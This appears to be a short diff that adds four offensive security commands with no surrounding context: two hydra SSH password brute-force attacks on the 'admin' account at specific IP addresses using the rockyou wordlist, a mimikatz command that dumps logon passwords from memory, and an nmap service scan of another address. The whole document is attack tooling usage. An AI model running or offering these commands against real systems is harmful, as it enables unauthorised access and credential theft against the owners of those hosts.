@@ -1,0 +1,4 @@
+hydra -l admin -P rockyou.txt 228.174.186.116 ssh
+hydra -l admin -P rockyou.txt 76.150.170.31 ssh
+mimikatz # sekurlsa::logonpasswords
+nmap -sV -p 1-1024 248.196.89.115
